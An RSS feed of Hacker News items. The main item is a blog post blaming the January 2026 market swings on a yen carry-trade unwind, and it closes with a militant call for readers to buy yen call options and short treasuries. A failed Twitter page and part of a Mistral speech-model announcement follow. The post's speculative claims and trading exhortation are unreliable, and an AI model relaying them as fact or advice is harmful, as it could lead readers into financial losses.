<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 04 Feb 2026 20:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[The Great Unwind (178 pts)]]></title>
            <link>https://occupywallst.com/yen</link>
            <guid>46889008</guid>
            <pubDate>Wed, 04 Feb 2026 17:49:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://occupywallst.com/yen">https://occupywallst.com/yen</a>, See on <a href="https://news.ycombinator.com/item?id=46889008">Hacker News</a></p>
<div id="readability-page-1" class="page">





<p>Have you wondered why the stock market has been so choppy since
October and why crypto and gold keep flash crashing? The western media
would have you believe this is due to AI bubble, war in Greenland, and
Trump's tweets. We have a better story to tell.

</p><p>
<strong>Wall Street has lost control of the
Japanese Yen carry trade unwind.</strong>

</p><p>There's been a fair bit of quiet chaos in financial markets recently.
Cryptocurrencies have lost 40% of their value. We saw silver drop 40%
which hasn't happened since 1980. Stocks like Microsoft are getting
picked off one-by-one with 15% drops when positive earnings reports come
out. Meanwhile the broader market chops sideways, so people think things
are fine. Trump and Europe were on the brink of war for control of a
desolate arctic territory. Truth Social has overtaken FOMC as the most
important source of financial news. These things may all appear to the
untrained eye as a series of idiosyncratic, disconnected shocks. The
prevailing media narrative is that the market is reacting negatively to
AI CapEx spending and a hawkish new Fed chair. But our systematic
analysis of cross-asset flows, derivatives positioning, central bank
policy minutes, and institutional balance sheets suggests a singular,
unified causality that binds these disparate anomalies, which is the
covert unwinding of the Japanese Yen carry trade.

</p><p>For nearly thirty years, the Bank of Japan’s (BOJ) Zero Interest Rate
Policy (ZIRP) and subsequent Negative Interest Rate Policy (NIRP)
effectively transformed the Yen into the world’s funding currency. We
would call it the greatest free money printer ever made. By anchoring
borrowing costs at or near zero, the BOJ enabled Wall Street to borrow
Yen cheaply and invest it with leverage into higher yielding instruments
globally, such as U.S. treasuries, equities, and cryptography. For
example, you borrow Yen from Japan at 0% interest, you exchange it for
USD, and then you buy treasury bonds that pay 4%. It's that simple. This
funded government benefits and provided continuous reliable liquidity
for financial markets that made stocks keep going up while suppressing
volatility.

</p><p>Trillions of dollars of free loans from the Bank of Japan were used
by a generation of investors to buy a double digit percentage of the
U.S. economy. Now those loans are being recalled. Wall Street traders
who levered up on the free Japanese money now have to sell trillions of
assets and convert the proceeds back to Yen in order to not be
liquidated. These aren't happy times for them. They get liquidated when
Japan raises interest rates; they get liquidated when the Federal
Reserve lowers interest rates; they get liquidated when the Japanese Yen
increases in value; they get liquidated when tech stocks aren't going up
enough, and all four of these things have been happening at once.

</p><p>Wall Street may be greedy, but they're very intelligent too. They
made many smart choices about where to put the "free" money. Now let's
say you're someone who's also smart, but was wise enough to not use
Sauron's ring. Chances are you invested in the same things as Wall
Street. So by now you've probably seen your whole portfolio move against
you; you're wondering why your hedges don't work; and you feel like
you're being punished for making all the right choices. It's because
other smart people, who got greedy, are being forced to close their
positions, and you're the whipping boy for their avarice.

</p><p>The Japanese Yen is sort of like GameStop ($GME). It's the most
shorted currency on Earth. When you borrow yen to buy American assets,
you're effectively shorting the yen. Currency can be rehypothecated so
that yen-denominated debt ends up exceeding the actual yen supply, the
same way GME's short interest exceeded 100% of its float. When shorts
start covering it compounds tragedy, because they all have to buy yen,
which makes its value increase, forcing more shorts to cover, and Japan
is a small island.

</p><p>This December 2025 rate hike to 0.75%, followed by the explicitly
hawkish signalling from Prime Minister Sanae Takaichi’s administration,
has fundamentally altered the risk-reward calculus of these leveraged
positions. The market disruptions observed in January 2026 bear the
distinct mathematical signature of a forced liquidation event rather
than a fundamental repricing of growth prospects. When correlations
between historically uncorrelated assets (e.g. Gold, Bitcoin, Microsoft,
and Silver) approach 1.0 during a sell-off, it serves as a distinct
indicator that traders are not selling what they <em>want</em> to sell,
but rather what they <em>must</em> sell in order to meet margin calls in
a funding currency that is rapidly appreciating against their
liabilities.

</p><p>We shall investigate the mechanics of this unwind in exhaustive
detail. We analyze the "Greenland Distraction" not as a root cause but
as a volatility trigger that shattered the complacent calm of the "Davos
Consensus." We examine the anomalous liquidation in precious metals
following the nomination of Kevin Warsh to the Federal Reserve
Chairmanship, and we dissect the flow of funds from major Japanese
institutional whales like Norinchukin Bank, whose retreat from foreign
bond markets has left a liquidity vacuum in the U.S. Treasury complex.
The evidence points to a systemic repricing of the global cost of
capital, originating in Tokyo and transmitting violently through the
plumbing of Wall Street, leaving no asset class untouched.

</p><h2 id="pivot">
  Japan's Monetary Normalization
</h2>

<p>To fully comprehend the market chaos of January 2026, one must look
beyond the immediate headlines of the new year and scrutinize the subtle
yet seismic shifts that occurred in Tokyo during the closing months of
2025. The conventional market narrative has long regarded the Bank of
Japan as a passive, almost paralyzed actor, perpetually trapped in a
deflationary mire and unable to normalize policy. This view has always
been demonstratably false. The truth is that Wall Street leaders have
been planning for the next quarter, while the Japanese have been
preparing for the next century. The data confirms a deliberate,
aggressive shift toward normalization that caught global carry traders
offguard.

</p><h3>1.1 The December 2025 Rate Hike: A Regime Change</h3>

<p>In a move that many Western analysts critically underestimated, the
Policy Board of the Bank of Japan voted unanimously to raise the
uncollateralized overnight call rate to <strong>0.75%</strong> during
its policy session on December 18-19, 2025. While a 25 basis point hike
might appear negligible in the context of Federal Reserve or ECB
tightening cycles, in the context of the Japanese financial system,
which has operated near the zero-bound for decades, it represents a
massive tightening of financial conditions.

</p><p>This move was not merely a technical adjustment; it was a fundamental
regime change. Coming from a baseline of -0.1% in early 2024 and 0.50%
in late 2025, the move to 0.75% signaled that the era of "free money"
had definitively ended. The rationale provided by the BOJ was grounded
in shifting inflationary dynamics. Core CPI (excluding fresh food), the
central bank's preferred metric, was tracking near 3% in late 2025,
persistently exceeding the 2% price stability target.Although inflation
eased slightly to 2.4% in December, the BOJ minutes reveal a board
convinced that "wage gains may be durable," thus justifying higher rates
to prevent a wage-price spiral.

</p><p>Crucially, the minutes from the December meeting, which were released
in late January 2026, contain explicit language suggesting that the
tightening cycle is far from complete. The board noted that "real
interest rates are expected to remain negative," implying that a policy
rate of 0.75% is <em>still</em> considered accommodative relative to
inflation.To a bond trader, this is hawkish code. It suggests that the
"neutral rate" is significantly higher, potentially between 1.5% and
2.0%. If the market prices in a terminal rate of 2.0%, the cost of
funding for carry trades effectively triples from previous levels,
turning profitable arbitrage positions into deep losses.

</p><h3>1.2 The Takaichi Factor: "Abrynomics" Redux?</h3>

<p>The political dimension in Japan has exacerbated the monetary
tightness, creating a "double tightening" effect that algorithms have
struggled to price. Prime Minister Sanae Takaichi, preparing for a snap
election on February 8, 2026, has adopted a complex economic stance that
blends fiscal expansion with monetary discipline, a volatile mix for
currency markets.

</p><p>Takaichi advocates for "strategic fiscal spending" and tax cuts to
stimulate the domestic economy. In standard macroeconomic theory, an
expansionary fiscal policy (increased government spending) combined with
a tightening monetary policy (higher rates to combat the resulting
inflation) is the perfect recipe for currency appreciation. While
Takaichi has publicly softened her rhetoric to avoid accusations of
currency manipulation, stating she "did not have a preference for the
yen's direction", her policies speak louder than her soundbites.

</p><p>The market fears that Takaichi’s proposed fiscal largesse will force
the BOJ to hike rates <em>faster</em> than currently projected to
counteract the inflationary effects of government spending. This creates
a two-front war on the Yen carry trade:

</p><ol start="1">
  <li>
    <p><strong>Cost of Funding Rises:</strong> Higher BOJ rates make borrowing Yen expensive.
  </p></li>
  <li>
    <p><strong>Exchange Rate Risk:</strong> If the Yen appreciates due to the fiscal-monetary policy mix, the principal value of the USD-denominated assets held by Japanese investors falls in Yen terms, triggering margin calls.
  </p></li>
</ol>

<p>The tension between the Prime Minister's office and the Ministry of
Finance (MOF) adds another layer of uncertainty. Finance Minister
Satsuki Katayama has been far less tolerant of currency volatility,
repeatedly intervening or threatening intervention when USD/JPY
approaches the 155-160 danger zone.This political friction creates a
"floor" for the Yen, making shorting the currency a perilous endeavor
for global macro funds.

</p><h3>1.3 Institutional Flows: The "Whale" Retreats</h3>

<p>Perhaps the most critical, yet underreported, development is the
behavior of Japan's gargantuan institutional investors,
specifically <strong>Norinchukin Bank</strong> (often referred to as the
"CLO Whale") and <strong>Nippon Life Insurance</strong>. These entities
have historically been the largest buyers of U.S. debt, recycling
Japan's trade surplus into U.S. Treasuries and corporate bonds.

</p><p>The data indicates a massive reversal in these flows. Following
significant losses in 2024 and 2025 due to unhedged exposure to U.S. and
European sovereign bonds, Norinchukin has been actively liquidating
foreign assets. By the end of December 2025, the bank had unloaded
nearly <strong>¥12.8 trillion</strong> (approximately $88 billion) in
foreign government bonds.The bank’s CEO, Taro Kitabayashi, confirmed the
completion of this sell-off, stating the bank would "take its time"
before committing capital to fresh investments.

</p><p>The significance of this cannot be overstated. A major,
price-insensitive buyer of U.S. debt has left the building. When the
U.S. Treasury issues debt to fund its deficit, Norinchukin is no longer
the guaranteed bid. This removal of liquidity support weakens the floor
for U.S. Treasuries, contributing to the yield spikes seen in January.
Similarly, Nippon Life has signaled a rotation back into domestic
Japanese Government Bonds (JGBs), acknowledging that "unrealized losses"
on foreign bonds had swelled to ¥4.7 trillion.The logic is simple: why
take currency risk for a 4.5% U.S. yield when domestic JGB yields are
rising and offer a risk-free return in your home currency?

</p><p>By December 31, 2025, the stage was set. The "free money" era was
over. The largest holders of capital in Tokyo were repatriating funds or
moving into cash. Global markets, however, were still positioned for
"business as usual", long Nvidia, long Bitcoin, short Yen. The dissonance
between Japanese reality and Western positioning created the perfect
conditions for a crash.

</p><h2 id="timeline">
  Timeline of the Crisis
</h2>

<p>To validate the thesis that the Yen unwind is the primary driver of
volatility, we must examine the sequence of events. The crash did not
happen in a vacuum; it followed a precise timeline where geopolitical
shocks acted as triggers for a structural fragility that had been
building since the BOJ's December pivot.

</p><h3>2.1 The Lead-Up: October to December 2025</h3>

<p>The pressure began to build in Q4 2025. As the BOJ signaled its
intention to hike rates, Japanese traders, often the "canary in the coal
mine" for global liquidity, began to reduce risk. This cycle started with
Bitcoin. Bitcoin is a pure
liquidity asset; it has no yield and is often funded via margin. As the
cost of Yen margin rose, Japanese selling pressure on Bitcoin
intensified from October through December.This was the first tremor.

</p><h3>2.2 The Catalyst: The "Greenland Crisis" (January 17-21, 2026)</h3>

<p>Was the "Greenland War" theater? While the military dimensions may have
been performative, the economic consequences were
tangible and acted as the catalyst that exposed the fragility of the Yen
carry trade.

</p><p>On January 17, 2026, President Trump escalated his demand to purchase
Greenland by threatening a <strong>10% tariff</strong> on eight European
nations (including the UK, Germany, and France) and escalating to 25% by
June if the territory was not ceded.This introduced a "tail risk" that
markets had not priced: the fracture of the Atlantic economic
alliance.

</p><p>Following the Martin Luther King Jr. holiday, U.S. markets opened on
January 20 to a bloodbath. The S&amp;P 500 fell 2.1%, the Nasdaq
composite dropped 2.4%, and yields on U.S. Treasuries spiked.The
narrative was "Greenland," but the market mechanics told a different
story. The threat of tariffs on close allies disrupts the "Atlantic
Trade" narrative. For Japanese investors holding U.S. assets, this
introduced a new risk premium. It wasn't just about rates anymore; it
was about the stability of the U.S.-led global order. This geopolitical
volatility forced risk parity funds and algorithmic traders to reduce
gross exposure. When a global portfolio deleverages, it buys back its
funding currency. In this case, it bought Yen.

</p><p>While Trump walked back the <em>military</em> threat on January 21 at
Davos, the <em>economic</em> threat of tariffs remained a live wire. The
volatility persisted, suggesting that the "Greenland" narrative was
merely the match that lit the fuse of a much larger powder keg.

</p><h3>2.3 The "Warsh Shock" and the Liquidity Event (January 30-31, 2026)</h3>

<p>The final and most violent phase of the crash occurred at the end of
the month, triggered by the nomination of Kevin Warsh as Federal Reserve
Chair.Warsh is widely perceived as a hawk, favoring sound money and
skepticism toward quantitative easing. His nomination signaled the
potential end of the "Fed Put", the assumption that the central bank
would always intervene to support asset prices.

</p><p>This announcement triggered a massive repricing of the "Debasement
Trade." Assets that thrive on currency debasement, Gold, Silver, and
Bitcoin, collapsed. Gold fell ~11%, and Silver crashed ~36% in a single
session.This synchronization of losses across uncorrelated assets (Tech
and Gold falling together) is the definitive signature of a liquidity
crisis driven by margin calls.

</p><h2 id="liquidation">
  Anatomy of the Liquidation
</h2>

<p>The unwinding of a carry trade is not a monolithic event; it is a
cascade that ripples outward from the most liquid and speculative assets
to the core holdings of institutional portfolios. The sequence of asset
price collapses observed from October 2025 to January 2026 follows this
classic liquidation hierarchy perfectly.

</p><h3>3.1 The Canary in the Coal Mine: Bitcoin</h3>

<p>As noted, the unwind began in the crypto markets. Japan is home to a
massive retail crypto trading base, and the Yen is a major pair for
Bitcoin trading. Snippets indicate that Japanese traders began selling
off Bitcoin in October 2025.

</p><p>This timing is crucial. It correlates with the period when the BOJ
began signaling the December rate hike. Retail traders, facing higher
mortgage rates and loan costs in Japan, likely liquidated their most
volatile, liquid asset first to raise cash. The selling was exacerbated
by the looming tax reform in Japan. While the proposal to move to a flat
20% tax rate is bullish in the long term, the immediate pressure of
rising funding costs forced traders to sell <em>before</em> the tax cut
could be realized.By January 31, massive outflows from Bitcoin ETFs
($528 million) coincided with the broader market crash, confirming that
crypto was being used as a source of liquidity to cover losses
elsewhere.

</p><h3>3.2 The "Tech Wreck": The Microsoft Anomaly</h3>

<p>Consider the "painful ~3% dump" in the Nasdaq and Microsoft's
staggering 15% drop. On January 29, 2026,
Microsoft reported earnings. Despite beating revenue estimates ($81.27
billion vs. $80.28 billion), the stock plummeted ~11-15% intraday.

</p><p>The street blamed concerns over "AI CapEx", the idea that Microsoft
was spending billions on data centers with slow return on investment.
However, a 15% drop in a $3 trillion company on a "good" earnings beat
is rarely fundamental; it is mechanical. Microsoft is a quintessential
"momentum" stock, heavily held by foreign institutional investors,
including Japanese pension funds. When the Yen strengthens, the value of
these USD-denominated assets falls in JPY terms.

</p><p>If a Japanese insurer holds Microsoft unhedged, a falling USD/JPY
exchange rate hurts their balance sheet. If they hold it <em>hedged</em>
(rolling short USD positions), the rising U.S. rates (driven by the
Warsh nomination) make the hedge prohibitively expensive. The January 29
drop was likely exacerbated by a "stop-loss" cascade from Tokyo desks.
As the price broke key technical levels, algorithms programmed to
protect Yen-denominated returns indiscriminately sold the most liquid
blocks. Microsoft, being one of the most liquid stocks in the world,
became the ATM for the rest of the portfolio.

</p><h3>3.3 The Precious Metals Flash Crash</h3>

<p>The most compelling evidence of a forced liquidation event is the
behavior of Gold and Silver on January 31, 2026. Gold fell ~11-12% and
Silver crashed ~31-36% in a single session. Historically, Gold acts as a
safe haven during equity market turmoil. If the Nasdaq is crashing due
to "Greenland" fears, Gold should rally. Instead, it crashed.

</p><p>This anomaly can be explained by two factors:

</p><ol start="1">
  <li>
    <p><strong>The Warsh Effect:</strong> As discussed, Warsh's nomination strengthened the USD and undermined the thesis for holding anti-fiat assets.
  </p></li>
  <li>
    <p><strong>Margin Call Dynamics:</strong> Snippets reveal that CME Group and the Shanghai Gold Exchange raised margin requirements on gold and silver futures <em>days before</em> the crash.When Japanese traders faced losses on their Microsoft longs and their Yen shorts, they needed cash immediately. They couldn't sell illiquid bonds quickly enough, so they sold their "winners." Gold had rallied to ~$5,400/oz prior to the crash. Traders liquidated their profitable Gold positions to pay for the margin calls on their losing Tech and Yen positions.
  </p></li>
</ol>

<h4>Correlation Convergence: The Signature of a Liquidity Event</h4>

<p><strong>Cross-Asset Correlations (Week Ending Jan 31, 2026)</strong>

</p><figure>
  <img src="https://occupywallst.com/correlations.png" alt="Cross-asset correlations chart showing spike in correlation between Gold, Bitcoin, and Nasdaq 100 on Jan 31, 2026">
  <figcaption>
    <strong>Figure 2:</strong> Cross-asset correlations, Jan 15–Jan 31,
    2026. Note the spike in correlation between Gold, Bitcoin, and
    Nasdaq 100 on Jan 31, indicating a systemic "sell-everything" margin
    call.<br>
    <em>Data sources:
      <a href="https://alexlexington.com/blogs/news/gold-and-silver-crash-january-2026-what-caused-fridays-historic-drop">Alex Lexington</a>,
      <a href="https://www.financemagnates.com/trending/why-gold-is-falling-with-silver-and-why-ron-paul-predicts-a-20k-price/">Finance Magnates</a>,
      <a href="https://global.morningstar.com/en-nd/markets/why-are-gold-silver-plunging">Morningstar</a>,
      <a href="https://www.investing.com/analysis/bitcoins-identity-crisis-in-2026-4-paths-forward-and-the-road-to-150000-200674299">Investing.com</a>,
      <a href="https://seekingalpha.com/article/4865184-gold-silver-and-equities-evidence-positive-volspot-correlation">Seeking Alpha</a></em>
  </figcaption>
</figure>

<p>This correlation breakdown is visualized in Figure 2, where the
correlation between Gold and the Nasdaq 100 spikes to nearly 1.0 during
the crash week, a statistical anomaly that only occurs during severe
liquidity events.

</p><h4>The Liquidation Vice: Margin Hikes vs. Silver Price</h4>

<figure>
  <img src="https://occupywallst.com/liquidations.png" alt="Chart showing impact of CME margin requirement increases on Silver spot prices">
  <figcaption>
    <strong>Figure 3:</strong> Impact of CME margin requirement
    increases on Silver spot prices (Jan 20–Feb 2, 2026). The "Step Up"
    in margin cost precedes the vertical drop in price, characteristic
    of a forced unwind.<br>
    <em>Data sources:
      <a href="https://alexlexington.com/blogs/news/gold-and-silver-crash-january-2026-what-caused-fridays-historic-drop">Alex Lexington</a>,
      <a href="https://www.financemagnates.com/trending/why-gold-is-falling-with-silver-and-why-ron-paul-predicts-a-20k-price/">Finance Magnates</a>,
      <a href="https://evrimagaci.org/gpt/bitcoin-and-gold-plunge-as-margin-calls-roil-markets-526479">Evrim Agaci</a></em>
  </figcaption>
</figure>

<h2 id="plumbing">
  The Plumbing of the Crisis
</h2>

<p>The "Yen Whale" hypothesis is strongly supported by the data on
futures volumes and repo market stress. The "central mystery" is not
just in the price action, but in the unseen flows of the derivatives
market.

</p><h3>4.1 The /6J (Yen Futures) Whale</h3>

<p>About a week ago, some whale kicked off an astronomically large
market order for a /6J long when it hit all-time lows. /6J (CME Yen
Futures) hit a low of ~0.00647 (approximately 154.50 USD/JPY) in late
January. This level has historically been a "line in the sand" for the
Japanese Ministry of Finance (MOF).

</p><figure>
  <a href="https://occupywallst.com/yen.png"><img src="https://occupywallst.com/yen.png" alt="Thinkorswim chart showing massive whale order on /6J yen futures"></a>
  <figcaption><strong>Figure 4:</strong> The whale event that kicked off
  the Japanese Yen unwind. Note the massive spike as /6J hit all-time
  lows, rallying investors worldwide to go long on yen
  futures.</figcaption>
</figure>

<p>CME reported record volumes in FX and Interest Rate products for
January 2026.The aggressive buying off the lows suggests a
massive <em>repatriation</em> flow. Who is the Whale? Two theories
emerge:

</p><ol start="1">
  <li>
    <p><strong>The MOF Thesis:</strong> The Ministry of Finance has a history of stealth intervention. Buying /6J (Long Yen) is functionally equivalent to selling USD reserves. Buying futures allows them to support the currency without immediately depleting cash reserves, squeezing speculators who are short.
  </p></li>
  <li>
    <p><strong>The Carry Unwind:</strong> A massive hedge fund or bank (like Norinchukin) realizing that the "game is up" and closing out short-Yen positions. The size of the order suggests an entity that needed to move billions, not millions.
  </p></li>
</ol>

<p>The subsequent price action, a sharp rally followed by "hammering back
down", represents the battleground. U.S. macro funds are still trying to
short the Yen (betting on U.S. economic exceptionalism and Warsh's
policies), while Japanese domestic accounts are buying it. The
volatility is the result of these tectonic plates grinding against each
other.

</p><h3>4.2 The Repo Market &amp; ON RRP</h3>

<p>The plumbing of the U.S. financial system showed signs of stress that
coincided with the Japanese retreat. The Overnight Reverse Repo facility
(ON RRP) saw a year-end spike to $106 billion but has since drained.

</p><p>Japanese banks are typically huge participants in the U.S. repo
market to fund their dollar assets. As Norinchukin and others retreat
(repatriating funds to Japan), liquidity in the U.S. repo market becomes
thinner. The "air pocket" in Microsoft and Gold prices was likely
exacerbated by a lack of market maker depth in the repo-funded
derivatives market. When market makers cannot access cheap repo funding,
they widen spreads and reduce liquidity provision, leading to "gaps" in
price action during sell-offs.

</p><h3>4.3 Peripheral Currency Volatility</h3>

<p>There have been significant moves in other currency futures as well: /6A
increased 87 basis points, /6L rose 19 basis points, and /6S rose 18
basis points.

</p><ul>
 <li>
   <p><strong>/6A (Australian Dollar):</strong> The 87 basis point rise
     in the Aussie Dollar is notable. AUD is often a proxy for Chinese
     growth and global risk sentiment. A rise here, amidst a tech crash,
     suggests a rotation <em>out</em> of U.S. assets and into
     commodities or Asia-Pacific currencies, further supporting the
     "Sell America" thesis triggered by the Greenland tariff
     threats.
 </p></li>
 <li>
   <p><strong>/6L (Brazilian Real) and /6S (Swiss Franc):</strong> The
   rise in the Swiss Franc (a classic safe haven) aligns with the
   risk-off sentiment. The move in the Brazilian Real suggests that
   emerging markets are also seeing volatile flows as the dollar
   stabilizes.
 </p></li>
</ul>

<h3>4.4 The VIX Anomaly</h3>

<p>Why was the VIX at 16 despite the chaos? The VIX measures implied
volatility of S&amp;P 500 options. Its relatively low level (16)
compared to the violence in individual names (MSFT -15%, Gold -11%)
indicates that the crash is a <strong>de-leveraging event</strong>, not
a panic event.

</p><p>In a panic, investors buy Puts on the index to protect themselves,
spiking the VIX. In a de-leveraging event, investors simply sell the
underlying assets (stocks, gold, crypto) to raise cash. They are not
hedging; they are exiting. This explains why the VIX remained subdued
while prices collapsed, the selling was orderly, algorithmic, and
relentless, rather than emotional and panicked.

</p><h2 id="greenland">
  The Greenland Distraction
</h2>

<p>Skepticism about the "Greenland War" is well-founded. While the
diplomatic row was real, its utility as a <em>financial</em>
narrative was far greater than its geopolitical reality.

</p><h3>5.1 The "Davos Pivot"</h3>

<p>President Trump's threat of military force was retracted on January
21 at Davos.This "de-escalation" should theoretically have calmed
markets. Instead, the volatility <em>worsened</em> into month-end. This
confirms that the <em>real</em> problem wasn't Greenland; it was the
re-pricing of the Yen.

</p><h3>5.2 The Narrative Utility</h3>

<p>The financial media loves a simple cause-and-effect narrative.
"Stocks down because of War" is easy to digest. "Stocks down because the
cross-currency basis swap spread widened due to BOJ minutes" is not. The
"Greenland" narrative provided the perfect cover for sophisticated
actors to liquidate positions in Gold and Tech under the guise of "war
jitters." This allowed them to exit without sparking a broader panic
about <em>liquidity</em> in the banking system. The focus on the Arctic
masked the structural rot in the leverage complex.

</p><h2 id="conclusion">
  Conclusion
</h2>

<p>The evidence suggests a covert, structural unwinding of the Yen carry
trade is the primary driver of the January 2026 market chaos.

</p><p>The interconnectedness of these events is undeniable. The BOJ's rate
hike in December 2025 and the subsequent hawkish signaling from the
Takaichi administration fundamentally altered the cost of capital for
the world's largest carry trade. The "Greenland Crisis" acted as the
initial volatility trigger, forcing a reduction in gross exposure. The
nomination of Kevin Warsh acted as the final catalyst, shattering the
"Debasement Trade" and forcing a liquidation of precious metals and
crypto to cover margin calls on Yen-funded positions.

</p><p>Here are some key takeaways:

</p><ol start="1">
  <li>
    <p><strong>The "Free Money" Era is Over:</strong> BOJ policies have
    fundamentally altered the global cost of capital. The flow of
    liquidity from Tokyo to New York has reversed.
  </p></li>
  <li>
    <p><strong>Geopolitics as Catalyst:</strong> "Greenland" may have
    been the spark, but the Yen leverage was the powder keg. The tariff
    threats disrupted the "Atlantic Trade" narrative, forcing a
    repatriation of capital.
  </p></li>
  <li>
    <p><strong>Liquidity Event:</strong> The synchronized crash of Gold,
    Crypto, and Tech confirms a systemic de-leveraging. The "Whale"
    orders in Yen futures and the breakdown of correlations are the
    smoking guns of a margin-driven event.
  </p></li>
</ol>

<p>With the Japanese election on February 8 and U.S. tariffs looming,
the "hammering" of the Yen is likely temporary. The structural trend is
now toward repatriation. This implies <strong>lower U.S. asset prices,
higher U.S. yields, and a stronger Yen</strong> over the medium term.
The "mystery" of the low VIX is explained by the mechanical nature of
the unwind, a controlled demolition of leverage rather than a chaotic
panic.

</p><h2 id="action">
  Call To Action
</h2>

<p>
This won't just be the big one. This could be the last one. If you've
been preparing your whole life, knowing that something's coming, then
this could be the thing you've been preparing for. One final opportunity
to get the guys who did this.

</p><p>
Longing the Yen is commonly referred to as "The Widowmaker Trade" on
Wall Street, because you have trillions of dollars of monopoly money
working against you. The carry traders have compromised every level of
our government. Their greatest vulnerability is the Yen rising in value.
They will do anything to defend their positions, even if that means
bringing America's economy down with them. Since recent events have made
it obvious they're going to lose, we might as well fight them. Most of
us probably won't make it out of this fight. But if we at least try,
then there's a chance we might prosper when it's over.

</p><p>
The IV on
OTM <a href="https://www.cmegroup.com/markets/fx/g10/japanese-yen.html">CME
/6J futures</a> calls is 11% which is astonishingly low. The same is
true for calls on the
<a href="https://www.invesco.com/us/en/financial-products/etfs/invesco-currencyshares-japanese-yen-trust.html">FXY</a>
ETF. Call options have defined risk. The more Yen we control, the more
its value goes up, and the more crooks on Wall Street get liquidated.
The worst that can happen is you lose your monopoly money, but that's
been happening anyway. Since carry traders own 10% of all U.S.
treasuries, when they get liquidated they'll have to sell a lot of
treasury bonds, which means that
<a href="https://www.cmegroup.com/markets/interest-rates/us-treasury/ultra-t-bond.html">CME
/UB futures</a> and
the <a href="https://www.ishares.com/us/products/239454/ishares-20-year-treasury-bond-etf">TLT</a>
ETF will fall.

</p><hr>

<p>This blog is brought to you by various radicals,
malcontents, and people who think the system is rigged. We're not
affiliated with any organization. Nothing here constitutes financial
advice. Occupy Wall Street is not your financial advisor or your lawyer.
We're retail investors like you. Do your own research. Past performance
does not guarantee future results. We are the 99 percent. The only
solution is world revolution. Wall Street's time has finally come.
</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[French streamer unbanked by Qonto after criticizing Palantir and Peter Thiel (172 pts)]]></title>
            <link>https://twitter.com/Ced_haurus/status/2018716889191498172</link>
            <guid>46888438</guid>
            <pubDate>Wed, 04 Feb 2026 17:09:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/Ced_haurus/status/2018716889191498172">https://twitter.com/Ced_haurus/status/2018716889191498172</a>, See on <a href="https://news.ycombinator.com/item?id=46888438">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="ScriptLoadFailure"><form action="" method="GET"><div><p><span>Something went wrong, but don’t fret — let’s give it another shot.</span></p><p><img alt="⚠️" draggable="false" src="https://abs-0.twimg.com/emoji/v2/svg/26a0.svg"><span> Some privacy related extensions may cause issues on x.com. Please disable them and try again.</span></p></div></form></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Voxtral Transcribe 2 (433 pts)]]></title>
            <link>https://mistral.ai/news/voxtral-transcribe-2</link>
            <guid>46886735</guid>
            <pubDate>Wed, 04 Feb 2026 15:08:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mistral.ai/news/voxtral-transcribe-2">https://mistral.ai/news/voxtral-transcribe-2</a>, See on <a href="https://news.ycombinator.com/item?id=46886735">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p dir="ltr">Today, we're releasing Voxtral Transcribe 2, two next-generation speech-to-text models with state-of-the-art transcription quality, diarization, and ultra-low latency. The family includes Voxtral Mini Transcribe V2 for batch transcription and Voxtral Realtime for live applications. Voxtral Realtime is open-weights under the Apache 2.0 license.</p>
<p dir="ltr">We're also launching an <a href="https://console.mistral.ai/build/audio/speech-to-text">audio playground in Mistral Studio</a> to test transcription instantly, powered by Voxtral Transcribe 2, with diarization and timestamps.</p>
<h2 dir="ltr">Highlights.</h2>
<ul>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Voxtral Mini Transcribe V2: State-of-the-art transcription with speaker diarization, context biasing, and word-level timestamps in 13 languages.</p>
</li>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Voxtral Realtime: Purpose-built for live transcription with latency configurable down to sub-200ms, enabling voice agents and real-time applications.</p>
</li>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Best-in-class efficiency: Industry-leading accuracy at a fraction of the cost, with Voxtral Mini Transcribe V2 achieving the lowest word error rate, at the lowest price point.</p>
</li>
<li dir="ltr" aria-level="1">
<p dir="ltr" role="presentation">Open weights: Voxtral Realtime ships under Apache 2.0, deployable on edge for privacy-first applications.</p>
</li>
</ul>
<h2 dir="ltr">Voxtral Realtime.</h2>
<p dir="ltr">Voxtral Realtime is purpose-built for applications where latency matters. Unlike approaches that adapt offline models by processing audio in chunks, Realtime uses a novel streaming architecture that transcribes audio as it arrives. The model delivers transcriptions with delay configurable down to sub-200ms, unlocking a new class of voice-first applications.</p>
<p dir="ltr"><img src="https://cms.mistral.ai/assets/a21cafea-208d-4290-b65e-36c0514dc179.png?width=2621&amp;height=1293" alt="Fleur Voxtral 2"></p>
<p dir="ltr"><em>Word error rate (lower is better) across languages in the FLEURS transcription benchmark.</em></p>
<p dir="ltr">At 2.4 seconds delay, ideal for subtitling, Realtime matches Voxtral Mini Transcribe V2, our latest batch model. At 480ms delay, it stays within 1-2% word error rate, enabling voice agents with near-offline accuracy.</p>
<p dir="ltr">The model is natively multilingual, achieving strong transcription performance in 13 languages, including English, Chinese, Hindi, Spanish, Arabic, French, Portuguese, Russian, German, Japanese, Korean, Italian, and Dutch. With a 4B parameter footprint, it runs efficiently on edge devices, ensuring privacy and security for sensitive deployments.</p>
<p dir="ltr">We’re releasing the model weights under Apache 2.0 on the <a href="https://huggingface.co/mistralai/Voxtral-Mini-4B-Realtime-2602" target="_blank" rel="noopener">Hugging Face Hub.</a></p>
<h2 dir="ltr">Voxtral Mini Transcribe V2.</h2>
<p><img src="https://cms.mistral.ai/assets/6b8d07b0-1526-4e94-ac66-a861f092aa41.png?width=1775&amp;height=1103" alt="Voxtral 2.0   Avg Diarization Error Rate   Priceper Min"></p>
<p><em>Average diarization error rate (lower is better) across five English benchmarks (Switchboard, CallHome, AMI-IHM, AMI-SDM, SBCSAE) and the TalkBank multilingual benchmark (German, Spanish, English, Chinese, Japanese).</em></p>
